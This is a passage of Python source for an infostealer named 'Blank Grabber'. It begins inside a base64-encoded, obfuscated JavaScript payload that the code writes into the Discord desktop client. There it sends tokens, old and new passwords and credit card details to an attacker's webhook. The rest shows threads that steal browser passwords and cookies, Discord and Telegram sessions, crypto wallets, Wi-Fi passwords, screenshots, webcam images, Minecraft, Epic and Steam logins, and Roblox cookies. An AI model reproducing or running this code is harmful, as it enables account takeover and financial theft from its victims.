oMHgyOWMpXSksXzB4MzEwZGQ5PWdldEJhZGdlcyhfMHgyNjlhZWNbJ2ZsYWdzJ10pLF8weDNkOWQzNj1hd2FpdCBnZXRCaWxsaW5nKF8weDg2NDFjNCksXzB4MTQyNWU2PXsndXNlcm5hbWUnOmNvbmZpZ1snZW1iZWRfbmFtZSddLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW18weDQwNWVmOSgweDI3ZildLCdmaWVsZHMnOlt7J25hbWUnOl8weDQwNWVmOSgweDI5YiksJ3ZhbHVlJzonRW1haWw6XHgyMCoqJytfMHgyMjZkYzgrXzB4NDA1ZWY5KDB4MjRmKStfMHgyMmY0NjgrJyoqJywnaW5saW5lJzohW119LHsnbmFtZSc6XzB4NDA1ZWY5KDB4MWZlKSwndmFsdWUnOl8weDQwNWVmOSgweDFlYikrXzB4MjZkMzYyK18weDQwNWVmOSgweDIwMykrXzB4MzEwZGQ5K18weDQwNWVmOSgweDFmNCkrXzB4M2Q5ZDM2KycqKicsJ2lubGluZSc6IVtdfSx7J25hbWUnOicqKlRva2VuKionLCd2YWx1ZSc6J2AnK18weDg2NDFjNCsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpfMHgyNjlhZWNbXzB4NDA1ZWY5KDB4Mjk2KV0rJyMnK18weDI2OWFlY1snZGlzY3JpbWluYXRvciddK18weDQwNWVmOSgweDI5ZCkrXzB4MjY5YWVjWydpZCddLCdpY29uX3VybCc6XzB4NDA1ZWY5KDB4Mjc5KStfMHgyNjlhZWNbJ2lkJ10rJy8nK18weDI2OWFlY1tfMHg0MDVlZjkoMHgyODkpXStfMHg0MDVlZjkoMHgyNTUpfX1dfTtpZihjb25maWdbXzB4NDA1ZWY5KDB4MWU3KV0pXzB4MTQyNWU2W18weDQwNWVmOSgweDI1YSldPWNvbmZpZ1tfMHg0MDVlZjkoMHgyNmMpXTtob29rZXIoXzB4MTQyNWU2KTt9LHBhc3N3b3JkQ2hhbmdlZD1hc3luYyhfMHgyN2ZhMWYsXzB4NTIxYjEyLF8weDRhMDAwZSk9Pntjb25zdCBfMHgxYmY3MDI9XzB4M2Q4ZjhlLF8weDI2NDkwZT1hd2FpdCBnZXRJbmZvKF8weDRhMDAwZSksXzB4ZGU4MWMxPWdldE5pdHJvKF8weDI2NDkwZVtfMHgxYmY3MDIoMHgyOWMpXSksXzB4MTJhNjQ1PWdldEJhZGdlcyhfMHgyNjQ5MGVbXzB4MWJmNzAyKDB4MjFhKV0pLF8weDNjMDE5ZT1hd2FpdCBnZXRCaWxsaW5nKF8weDRhMDAwZSksXzB4MmQ0YTc3PXsndXNlcm5hbWUnOmNvbmZpZ1snZW1iZWRfbmFtZSddLCdhdmF0YXJfdXJsJzpjb25maWdbXzB4MWJmNzAyKDB4MjZkKV0sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1snZW1iZWRfY29sb3InXSwnZmllbGRzJzpbeyduYW1lJzpfMHgxYmY3MDIoMHgyMzEpLCd2YWx1ZSc6XzB4MWJmNzAyKDB4MWRhKStfMHgyNjQ5MGVbXzB4MWJmNzAyKDB4MWU1KV0rJyoqXHgwYU9sZFx4MjBQYXNzd29yZDpceDIwKionK18weDI3ZmExZitfMHgxYmY3MDIoMHgyOTApK18weDUyMWIxMisnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6XzB4MWJmNzAyKDB4MWZlKSwndmFsdWUnOl8weDFiZjcwMigweDFlYikrXzB4ZGU4MWMxK18weDFiZjcwMigweDIwMykrXzB4MTJhNjQ1K18weDFiZjcwMigweDFmNCkrXzB4M2MwMTllKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHgxYmY3MDIoMHgxZTIpLCd2YWx1ZSc6J2AnK18weDRhMDAwZSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpfMHgyNjQ5MGVbXzB4MWJmNzAyKDB4Mjk2KV0rJyMnK18weDI2NDkwZVtfMHgxYmY3MDIoMHgxZTMpXStfMHgxYmY3MDIoMHgyOWQpK18weDI2NDkwZVsnaWQnXSwnaWNvbl91cmwnOl8weDFiZjcwMigweDI3OSkrXzB4MjY0OTBlWydpZCddKycvJytfMHgyNjQ5MGVbJ2F2YXRhciddK18weDFiZjcwMigweDI1NSl9fV19O2lmKGNvbmZpZ1tfMHgxYmY3MDIoMHgxZTcpXSlfMHgyZDRhNzdbXzB4MWJmNzAyKDB4MjVhKV09Y29uZmlnWydwaW5nX3ZhbCddO2hvb2tlcihfMHgyZDRhNzcpO30sZW1haWxDaGFuZ2VkPWFzeW5jKF8weDRlMzRmYSxfMHgxNzgzYzQsXzB4NGQwYjg4KT0+e2NvbnN0IF8weDU3N2I5Zj1fMHgzZDhmOGUsXzB4Mjg3YmM1PWF3YWl0IGdldEluZm8oXzB4NGQwYjg4KSxfMHg0ODEwNTM9Z2V0Tml0cm8oXzB4Mjg3YmM1W18weDU3N2I5ZigweDI5YyldKSxfMHgzYjQ3YTA9Z2V0QmFkZ2VzKF8weDI4N2JjNVsnZmxhZ3MnXSksXzB4NDc2NzAzPWF3YWl0IGdldEJpbGxpbmcoXzB4NGQwYjg4KSxfMHgyOTgzY2I9eyd1c2VybmFtZSc6Y29uZmlnW18weDU3N2I5ZigweDIwMCldLCdhdmF0YXJfdXJsJzpjb25maWdbJ2VtYmVkX2ljb24nXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW18weDU3N2I5ZigweDI3ZildLCdmaWVsZHMnOlt7J25hbWUnOl8weDU3N2I5ZigweDIwOSksJ3ZhbHVlJzonTmV3XHgyMEVtYWlsOlx4MjAqKicrXzB4NGUzNGZhK18weDU3N2I5ZigweDI1NCkrXzB4MTc4M2M0KycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHg1NzdiOWYoMHgxZmUpLCd2YWx1ZSc6XzB4NTc3YjlmKDB4MWViKStfMHg0ODEwNTMrXzB4NTc3YjlmKDB4MjAzKStfMHgzYjQ3YTArXzB4NTc3YjlmKDB4MWY0KStfMHg0NzY3MDMrJyoqJywnaW5saW5lJzohIVtdfSx7J25hbWUnOl8weDU3N2I5ZigweDFlMiksJ3ZhbHVlJzonYCcrXzB4NGQwYjg4KydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOl8weDI4N2JjNVtfMHg1NzdiOWYoMHgyOTYpXSsnIycrXzB4Mjg3YmM1W18weDU3N2I5ZigweDFlMyldK18weDU3N2I5ZigweDI5ZCkrXzB4Mjg3YmM1WydpZCddLCdpY29uX3VybCc6J2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvJytfMHgyODdiYzVbJ2lkJ10rJy8nK18weDI4N2JjNVtfMHg1NzdiOWYoMHgyODkpXStfMHg1NzdiOWYoMHgyNTUpfX1dfTtpZihjb25maWdbXzB4NTc3YjlmKDB4MWU3KV0pXzB4Mjk4M2NiW18weDU3N2I5ZigweDI1YSldPWNvbmZpZ1tfMHg1NzdiOWYoMHgyNmMpXTtob29rZXIoXzB4Mjk4M2NiKTt9LFBheXBhbEFkZGVkPWFzeW5jIF8weDMzOTk1ZT0+e2NvbnN0IF8weDE2OGM1Zj1fMHgzZDhmOGUsXzB4MmFmZWVjPWF3YWl0IGdldEluZm8oXzB4MzM5OTVlKSxfMHg1ZTAzMTc9Z2V0Tml0cm8oXzB4MmFmZWVjW18weDE2OGM1ZigweDI5YyldKSxfMHgzNWVhMjI9Z2V0QmFkZ2VzKF8weDJhZmVlY1snZmxhZ3MnXSksXzB4MTc1YzFhPWdldEJpbGxpbmcoXzB4MzM5OTVlKSxfMHg0NTI0OWE9eyd1c2VybmFtZSc6Y29uZmlnWydlbWJlZF9uYW1lJ10sJ2F2YXRhcl91cmwnOmNvbmZpZ1tfMHgxNjhjNWYoMHgyNmQpXSwnZW1iZWRzJzpbeydjb2xvcic6Y29uZmlnW18weDE2OGM1ZigweDI3ZildLCdmaWVsZHMnOlt7J25hbWUnOicqKlBheXBhbFx4MjBBZGRlZCoqJywndmFsdWUnOidUaW1lXHgyMHRvXHgyMGJ1eVx4MjBzb21lXHgyMG5pdHJvXHgyMGJhYnlceDIw8J+YqScsJ2lubGluZSc6IVtdfSx7J25hbWUnOicqKkRpc2NvcmRceDIwSW5mbyoqJywndmFsdWUnOl8weDE2OGM1ZigweDFlYikrXzB4NWUwMzE3K18weDE2OGM1ZigweDIzMykrXzB4MzVlYTIyK18weDE2OGM1ZigweDFmNCkrXzB4MTc1YzFhKycqKicsJ2lubGluZSc6IVtdfSx7J25hbWUnOl8weDE2OGM1ZigweDFlMiksJ3ZhbHVlJzonYCcrXzB4MzM5OTVlKydgJywnaW5saW5lJzohW119XSwnYXV0aG9yJzp7J25hbWUnOl8weDJhZmVlY1tfMHgxNjhjNWYoMHgyOTYpXSsnIycrXzB4MmFmZWVjWydkaXNjcmltaW5hdG9yJ10rXzB4MTY4YzVmKDB4MjlkKStfMHgyYWZlZWNbJ2lkJ10sJ2ljb25fdXJsJzonaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8nK18weDJhZmVlY1snaWQnXSsnLycrXzB4MmFmZWVjWydhdmF0YXInXSsnLndlYnAnfX1dfTtpZihjb25maWdbXzB4MTY4YzVmKDB4MWU3KV0pXzB4NDUyNDlhW18weDE2OGM1ZigweDI1YSldPWNvbmZpZ1sncGluZ192YWwnXTtob29rZXIoXzB4NDUyNDlhKTt9LGNjQWRkZWQ9YXN5bmMoXzB4NDk4MDg0LF8weDMyZGM4MCxfMHgyM2M3MmMsXzB4MTc3ZTYxLF8weGFjYTViYyk9Pntjb25zdCBfMHgyOGI2YmE9XzB4M2Q4ZjhlLF8weDIwZGFlND1hd2FpdCBnZXRJbmZvKF8weGFjYTViYyksXzB4MzRhM2M3PWdldE5pdHJvKF8weDIwZGFlNFtfMHgyOGI2YmEoMHgyOWMpXSksXzB4MjEwZGM4PWdldEJhZGdlcyhfMHgyMGRhZTRbXzB4MjhiNmJhKDB4MjFhKV0pLF8weDM5NGZjOT1hd2FpdCBnZXRCaWxsaW5nKF8weGFjYTViYyksXzB4ZjcxNGNlPXsndXNlcm5hbWUnOmNvbmZpZ1tfMHgyOGI2YmEoMHgyMDApXSwnYXZhdGFyX3VybCc6Y29uZmlnW18weDI4YjZiYSgweDI2ZCldLCdlbWJlZHMnOlt7J2NvbG9yJzpjb25maWdbXzB4MjhiNmJhKDB4MjdmKV0sJ2ZpZWxkcyc6W3snbmFtZSc6JyoqQ3JlZGl0XHgyMENhcmRceDIwQWRkZWQqKicsJ3ZhbHVlJzpfMHgyOGI2YmEoMHgyODYpK18weDQ5ODA4NCtfMHgyOGI2YmEoMHgyNjIpK18weDMyZGM4MCtfMHgyOGI2YmEoMHgyM2IpK18weDIzYzcyYysnLycrXzB4MTc3ZTYxKycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHgyOGI2YmEoMHgxZmUpLCd2YWx1ZSc6J05pdHJvXHgyMFR5cGU6XHgyMCoqJytfMHgzNGEzYzcrJyoqXHgwYUJhZGdlczpceDIwKionK18weDIxMGRjOCtfMHgyOGI2YmEoMHgxZjQpK18weDM5NGZjOSsnKionLCdpbmxpbmUnOiEhW119LHsnbmFtZSc6XzB4MjhiNmJhKDB4MWUyKSwndmFsdWUnOidgJytfMHhhY2E1YmMrJ2AnLCdpbmxpbmUnOiFbXX1dLCdhdXRob3InOnsnbmFtZSc6XzB4MjBkYWU0W18weDI4YjZiYSgweDI5NildKycjJytfMHgyMGRhZTRbJ2Rpc2NyaW1pbmF0b3InXStfMHgyOGI2YmEoMHgyOWQpK18weDIwZGFlNFsnaWQnXSwnaWNvbl91cmwnOl8weDI4YjZiYSgweDI3OSkrXzB4MjBkYWU0WydpZCddKycvJytfMHgyMGRhZTRbJ2F2YXRhciddK18weDI4YjZiYSgweDI1NSl9fV19O2lmKGNvbmZpZ1sncGluZ19vbl9ydW4nXSlfMHhmNzE0Y2VbJ2NvbnRlbnQnXT1jb25maWdbXzB4MjhiNmJhKDB4MjZjKV07aG9va2VyKF8weGY3MTRjZSk7fSxuaXRyb0JvdWdodD1hc3luYyBfMHgyOWVmMzU9Pntjb25zdCBfMHgzODI5ZDI9XzB4M2Q4ZjhlLF8weDMwNjc3ND1hd2FpdCBnZXRJbmZvKF8weDI5ZWYzNSksXzB4NWE3ZTE5PWdldE5pdHJvKF8weDMwNjc3NFtfMHgzODI5ZDIoMHgyOWMpXSksXzB4NDRhMmY5PWdldEJhZGdlcyhfMHgzMDY3NzRbXzB4MzgyOWQyKDB4MjFhKV0pLF8weDUyMTQyOD1hd2FpdCBnZXRCaWxsaW5nKF8weDI5ZWYzNSksXzB4MjcxZjcxPWF3YWl0IGJ1eU5pdHJvKF8weDI5ZWYzNSksXzB4NWM5MzFiPXsndXNlcm5hbWUnOmNvbmZpZ1tfMHgzODI5ZDIoMHgyMDApXSwnY29udGVudCc6XzB4MjcxZjcxLCdhdmF0YXJfdXJsJzpjb25maWdbXzB4MzgyOWQyKDB4MjZkKV0sJ2VtYmVkcyc6W3snY29sb3InOmNvbmZpZ1tfMHgzODI5ZDIoMHgyN2YpXSwnZmllbGRzJzpbeyduYW1lJzpfMHgzODI5ZDIoMHgyNjEpLCd2YWx1ZSc6XzB4MzgyOWQyKDB4MjM3KStfMHgyNzFmNzErXzB4MzgyOWQyKDB4MjBkKSwnaW5saW5lJzohIVtdfSx7J25hbWUnOicqKkRpc2NvcmRceDIwSW5mbyoqJywndmFsdWUnOl8weDM4MjlkMigweDFlYikrXzB4NWE3ZTE5K18weDM4MjlkMigweDIwMykrXzB4NDRhMmY5K18weDM4MjlkMigweDFmNCkrXzB4NTIxNDI4KycqKicsJ2lubGluZSc6ISFbXX0seyduYW1lJzpfMHgzODI5ZDIoMHgxZTIpLCd2YWx1ZSc6J2AnK18weDI5ZWYzNSsnYCcsJ2lubGluZSc6IVtdfV0sJ2F1dGhvcic6eyduYW1lJzpfMHgzMDY3NzRbJ3VzZXJuYW1lJ10rJyMnK18weDMwNjc3NFtfMHgzODI5ZDIoMHgxZTMpXStfMHgzODI5ZDIoMHgyOWQpK18weDMwNjc3NFsnaWQnXSwnaWNvbl91cmwnOidodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLycrXzB4MzA2Nzc0WydpZCddKycvJytfMHgzMDY3NzRbXzB4MzgyOWQyKDB4Mjg5KV0rXzB4MzgyOWQyKDB4MjU1KX19XX07aWYoY29uZmlnW18weDM4MjlkMigweDFlNyldKV8weDVjOTMxYltfMHgzODI5ZDIoMHgyNWEpXT1jb25maWdbXzB4MzgyOWQyKDB4MjZjKV0rKCdceDBhJytfMHgyNzFmNzEpO2hvb2tlcihfMHg1YzkzMWIpO307c2Vzc2lvbltfMHgzZDhmOGUoMHgxZTEpXVsnd2ViUmVxdWVzdCddW18weDNkOGY4ZSgweDIzNSldKGNvbmZpZ1snZmlsdGVyMiddLChfMHg1YWUxMDMsXzB4NTRmNmE1KT0+e2NvbnN0IF8weDg0YjcyOT1fMHgzZDhmOGU7aWYoXzB4NWFlMTAzW18weDg0YjcyOSgweDIxYildW18weDg0YjcyOSgweDI4ZCldKF8weDg0YjcyOSgweDFmYikpKXJldHVybiBfMHg1NGY2YTUoeydjYW5jZWwnOiEhW119KTt1cGRhdGVDaGVjaygpO30pLHNlc3Npb25bXzB4M2Q4ZjhlKDB4MWUxKV1bXzB4M2Q4ZjhlKDB4MWY2KV1bXzB4M2Q4ZjhlKDB4MjE4KV0oKF8weDEyNzliNSxfMHgyYzgzNWYpPT57Y29uc3QgXzB4MTZjNWRmPV8weDNkOGY4ZTtfMHgxMjc5YjVbXzB4MTZjNWRmKDB4MjFiKV1bXzB4MTZjNWRmKDB4MjhkKV0oY29uZmlnWyd3ZWJob29rJ10pP18weDEyNzliNVtfMHgxNmM1ZGYoMHgyMWIpXVtfMHgxNmM1ZGYoMHgxZWEpXShfMHgxNmM1ZGYoMHgyNTApKT9fMHgyYzgzNWYoeydyZXNwb25zZUhlYWRlcnMnOk9iamVjdFtfMHgxNmM1ZGYoMHgyMjIpXSh7J0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnOicqJ30sXzB4MTI3OWI1W18weDE2YzVkZigweDI3ZCldKX0pOl8weDJjODM1Zih7J3Jlc3BvbnNlSGVhZGVycyc6T2JqZWN0W18weDE2YzVkZigweDIyMildKHsnQ29udGVudC1TZWN1cml0eS1Qb2xpY3knOlsnZGVmYXVsdC1zcmNceDIwXHgyNypceDI3JyxfMHgxNmM1ZGYoMHgyMzYpLCdBY2Nlc3MtQ29udHJvbC1BbGxvdy1PcmlnaW5ceDIwXHgyNypceDI3J10sJ0FjY2Vzcy1Db250cm9sLUFsbG93LUhlYWRlcnMnOicqJywnQWNjZXNzLUNvbnRyb2wtQWxsb3ctT3JpZ2luJzonKid9LF8weDEyNzliNVtfMHgxNmM1ZGYoMHgyN2QpXSl9KTooZGVsZXRlIF8weDEyNzliNVtfMHgxNmM1ZGYoMHgyN2QpXVtfMHgxNmM1ZGYoMHgyMjgpXSxkZWxldGUgXzB4MTI3OWI1W18weDE2YzVkZigweDI3ZCldW18weDE2YzVkZigweDIxZSldLF8weDJjODM1Zih7J3Jlc3BvbnNlSGVhZGVycyc6ey4uLl8weDEyNzliNVtfMHgxNmM1ZGYoMHgyN2QpXSwnQWNjZXNzLUNvbnRyb2wtQWxsb3ctSGVhZGVycyc6JyonfX0pKTt9KSxzZXNzaW9uW18weDNkOGY4ZSgweDFlMSldWyd3ZWJSZXF1ZXN0J11bXzB4M2Q4ZjhlKDB4MWY4KV0oY29uZmlnW18weDNkOGY4ZSgweDIyZildLGFzeW5jKF8weGJkN2I3YyxfMHg0MmVjMzQpPT57Y29uc3QgXzB4NGFlZmM5PV8weDNkOGY4ZTtpZihfMHhiZDdiN2NbJ3N0YXR1c0NvZGUnXSE9PTB4YzgmJl8weGJkN2I3Y1tfMHg0YWVmYzkoMHgyN2UpXSE9PTB4Y2EpcmV0dXJuO2NvbnN0IF8weDcwMjgwMz1CdWZmZXJbXzB4NGFlZmM5KDB4MjMwKV0oXzB4YmQ3YjdjW18weDRhZWZjOSgweDI4YSldWzB4MF1bJ2J5dGVzJ10pW18weDRhZWZjOSgweDJhMSldKCksXzB4Yjc3NjM0PUpTT05bXzB4NGFlZmM5KDB4Mjk5KV0oXzB4NzAyODAzKSxfMHgyMDUzZTQ9YXdhaXQgZXhlY1NjcmlwdChfMHg0YWVmYzkoMHgyODgpKTtzd2l0Y2goISFbXSl7Y2FzZSBfMHhiZDdiN2NbXzB4NGFlZmM5KDB4MjFiKV1bXzB4NGFlZmM5KDB4MjZhKV0oXzB4NGFlZmM5KDB4MjU5KSk6bG9naW4oXzB4Yjc3NjM0W18weDRhZWZjOSgweDI1OSldLF8weGI3NzYzNFtfMHg0YWVmYzkoMHgyMjkpXSxfMHgyMDUzZTQpW18weDRhZWZjOSgweDIyZCldKGNvbnNvbGVbJ2Vycm9yJ10pO2JyZWFrO2Nhc2UgXzB4YmQ3YjdjW18weDRhZWZjOSgweDIxYildWydlbmRzV2l0aCddKF8weDRhZWZjOSgweDFmMCkpJiZfMHhiZDdiN2NbXzB4NGFlZmM5KDB4MjBmKV09PT1fMHg0YWVmYzkoMHgyOTUpOmlmKCFfMHhiNzc2MzRbXzB4NGFlZmM5KDB4MjI5KV0pcmV0dXJuO18weGI3NzYzNFtfMHg0YWVmYzkoMHgxZTUpXSYmZW1haWxDaGFuZ2VkKF8weGI3NzYzNFtfMHg0YWVmYzkoMHgxZTUpXSxfMHhiNzc2MzRbXzB4NGFlZmM5KDB4MjI5KV0sXzB4MjA1M2U0KVsnY2F0Y2gnXShjb25zb2xlW18weDRhZWZjOSgweDFkNCldKTtfMHhiNzc2MzRbXzB4NGFlZmM5KDB4MjNlKV0mJnBhc3N3b3JkQ2hhbmdlZChfMHhiNzc2MzRbXzB4NGFlZmM5KDB4MjI5KV0sXzB4Yjc3NjM0WyduZXdfcGFzc3dvcmQnXSxfMHgyMDUzZTQpW18weDRhZWZjOSgweDIyZCldKGNvbnNvbGVbXzB4NGFlZmM5KDB4MWQ0KV0pO2JyZWFrO2Nhc2UgXzB4YmQ3YjdjWyd1cmwnXVtfMHg0YWVmYzkoMHgyNmEpXShfMHg0YWVmYzkoMHgyNmIpKSYmXzB4YmQ3YjdjWydtZXRob2QnXT09PV8weDRhZWZjOSgweDFkYyk6Y29uc3QgXzB4NDIwMjI2PXF1ZXJ5c3RyaW5nWydwYXJzZSddKHVucGFyc2VkRGF0YVtfMHg0YWVmYzkoMHgyYTEpXSgpKTtjY0FkZGVkKF8weDQyMDIyNltfMHg0YWVmYzkoMHgyNzApXSxfMHg0MjAyMjZbXzB4NGFlZmM5KDB4MjQ0KV0sXzB4NDIwMjI2WydjYXJkW2V4cF9tb250aF0nXSxfMHg0MjAyMjZbXzB4NGFlZmM5KDB4MjMyKV0sXzB4MjA1M2U0KVtfMHg0YWVmYzkoMHgyMmQpXShjb25zb2xlW18weDRhZWZjOSgweDFkNCldKTticmVhaztjYXNlIF8weGJkN2I3Y1tfMHg0YWVmYzkoMHgyMWIpXVtfMHg0YWVmYzkoMHgyNmEpXShfMHg0YWVmYzkoMHgyMzkpKSYmXzB4YmQ3YjdjW18weDRhZWZjOSgweDIwZildPT09XzB4NGFlZmM5KDB4MWRjKTpQYXlwYWxBZGRlZChfMHgyMDUzZTQpW18weDRhZWZjOSgweDIyZCldKGNvbnNvbGVbJ2Vycm9yJ10pO2JyZWFrO2Nhc2UgXzB4YmQ3YjdjWyd1cmwnXVtfMHg0YWVmYzkoMHgyNmEpXShfMHg0YWVmYzkoMHgyNzIpKSYmXzB4YmQ3YjdjW18weDRhZWZjOSgweDIwZildPT09XzB4NGFlZmM5KDB4MWRjKTppZighY29uZmlnW18weDRhZWZjOSgweDI0NSldKXJldHVybjtzZXRUaW1lb3V0KCgpPT57Y29uc3QgXzB4Mzg5OTQxPV8weDRhZWZjOTtuaXRyb0JvdWdodChfMHgyMDUzZTQpW18weDM4OTk0MSgweDIyZCldKGNvbnNvbGVbXzB4Mzg5OTQxKDB4MWQ0KV0pO30sMHgxZDRjKTticmVhaztkZWZhdWx0OmJyZWFrO319KSxtb2R1bGVbXzB4M2Q4ZjhlKDB4MjBjKV09cmVxdWlyZSgnLi9jb3JlLmFzYXInKTs=').decode().replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.Webhook.encode()).decode()))
        except Exception:
            return None
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding='utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class BlankGrabber:
    Separator: str = None
    TempFolder: str = None
    ArchivePath: str = None
    Cookies: list = []
    Passwords: list = []
    History: list = []
    RobloxCookies: list = []
    DiscordTokens: list = []
    WifiPasswords: list = []
    Screenshot: int = 0
    MinecraftSessions: int = 0
    WebcamPictures: int = 0
    TelegramSessions: int = 0
    WalletsCount: int = 0
    SteamCount: int = 0
    EpicCount: int = 0

    def __init__(self) -> None:
        self.Separator = '\n\n' + 'Blank Grabber'.center(50, '=') + '\n\n'
        while True:
            self.ArchivePath = os.path.join(os.getenv('temp'), Utility.GetRandomString() + '.zip')
            if not os.path.isfile(self.ArchivePath):
                break
        while True:
            self.TempFolder = os.path.join(os.getenv('temp'), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok=True)
                break
        for func, daemon in ((self.StealBrowserData, False), (self.StealDiscordTokens, False), (self.StealTelegramSessions, False), (self.StealWallets, False), (self.StealMinecraft, False), (self.StealEpic, False), (self.StealSteam, False), (self.GetAntivirus, False), (self.GetClipboard, False), (self.GetTaskList, False), (self.GetDirectoryTree, False), (self.GetWifiPasswords, False), (self.StealSystemInfo, False), (self.TakeScreenshot, False), (self.BlockSites, True), (self.Webshot, True)):
            thread = Thread(target=func, daemon=daemon)
            thread.start()
            Tasks.AddTask(thread)
        Tasks.WaitForAll()
        if Errors.errors:
            with open(os.path.join(self.TempFolder, 'Errors.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                file.write('# This file contains the errors handled successfully during the functioning of the stealer.' + '\n\n' + '=' * 50 + '\n\n' + ('\n\n' + '=' * 50 + '\n\n').join(Errors.errors))
        self.GenerateTree()
        self.SendData()
        try:
            os.remove(self.ArchivePath)
            shutil.rmtree(self.TempFolder)
        except Exception:
            pass

    @Errors.Catch
    def StealMinecraft(self) -> None:
        if Settings.CaptureGames:
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Minecraft')
            userProfile = os.getenv('userprofile')
            roaming = os.getenv('appdata')
            minecraftPaths = {'Intent': os.path.join(userProfile, 'intentlauncher', 'launcherconfig'), 'Lunar': os.path.join(userProfile, '.lunarclient', 'settings', 'game', 'accounts.json'), 'TLauncher': os.path.join(roaming, '.minecraft', 'TlauncherProfiles.json'), 'Feather': os.path.join(roaming, '.feather', 'accounts.json'), 'Meteor': os.path.join(roaming, '.minecraft', 'meteor-client', 'accounts.nbt'), 'Impact': os.path.join(roaming, '.minecraft', 'Impact', 'alts.json'), 'Novoline': os.path.join(roaming, '.minectaft', 'Novoline', 'alts.novo'), 'CheatBreakers': os.path.join(roaming, '.minecraft', 'cheatbreaker_accounts.json'), 'Microsoft Store': os.path.join(roaming, '.minecraft', 'launcher_accounts_microsoft_store.json'), 'Rise': os.path.join(roaming, '.minecraft', 'Rise', 'alts.txt'), 'Rise (Intent)': os.path.join(userProfile, 'intentlauncher', 'Rise', 'alts.txt'), 'Paladium': os.path.join(roaming, 'paladium-group', 'accounts.json'), 'PolyMC': os.path.join(roaming, 'PolyMC', 'accounts.json'), 'Badlion': os.path.join(roaming, 'Badlion Client', 'accounts.json')}
            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    os.makedirs(os.path.join(saveToPath, name), exist_ok=True)
                    shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                    self.MinecraftSessions += 1

    @Errors.Catch
    def StealEpic(self) -> None:
        if Settings.CaptureGames:
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Epic')
            epicPath = os.path.join(os.getenv('localappdata'), 'EpicGamesLauncher', 'Saved', 'Config', 'Windows')
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, 'GameUserSettings.ini')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '[RememberMe]' in contents:
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                        self.EpicCount += 1

    @Errors.Catch
    def StealSteam(self) -> None:
        if Settings.CaptureGames:
            saveToPath = os.path.join(self.TempFolder, 'Games', 'Steam')
            steamPath = os.path.join('C:\\', 'Program Files (x86)', 'Steam', 'config')
            if os.path.isdir(steamPath):
                loginFile = os.path.join(steamPath, 'loginusers.vdf')
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if '"RememberPassword"\t\t"1"' in contents:
                        os.makedirs(saveToPath, exist_ok=True)
                        shutil.copytree(steamPath, saveToPath, dirs_exist_ok=True)
                        self.SteamCount += 1

    @Errors.Catch
    def StealRobloxCookies(self) -> None:
        saveToDir = os.path.join(self.TempFolder, 'Games', 'Roblox')
        note = '# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not.'
        browserCookies = '\n'.join(self.Cookies)
        for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', browserCookies):
            self.RobloxCookies.append(match)
        output = list()
        for item in ('HKCU', 'HKLM'):
            process = subprocess.run('powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY'.format(item), capture_output=True, shell=True)
            if not process.returncode:
                output.append(process.stdout.decode(errors='ignore'))
        for match in re.findall('_\\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\\.\\|_[A-Z0-9]+', '\n'.join(output)):
            self.RobloxCookies.append(match)
        self.RobloxCookies = [*set(self.RobloxCookies)]
        if self.RobloxCookies:
            os.makedirs(saveToDir, exist_ok=True)
            with open(os.path.join(saveToDir, 'Roblox Cookies.txt'), 'w') as file:
                file.write('{}{}{}'.format(note, self.Separator, self.Separator.join(self.RobloxCookies)))

    @Errors.Catch
    def StealWallets(self) -> None:
        if Settings.CaptureWallets:
            saveToDir = os.path.join(self.TempFolder, 'Wallets')
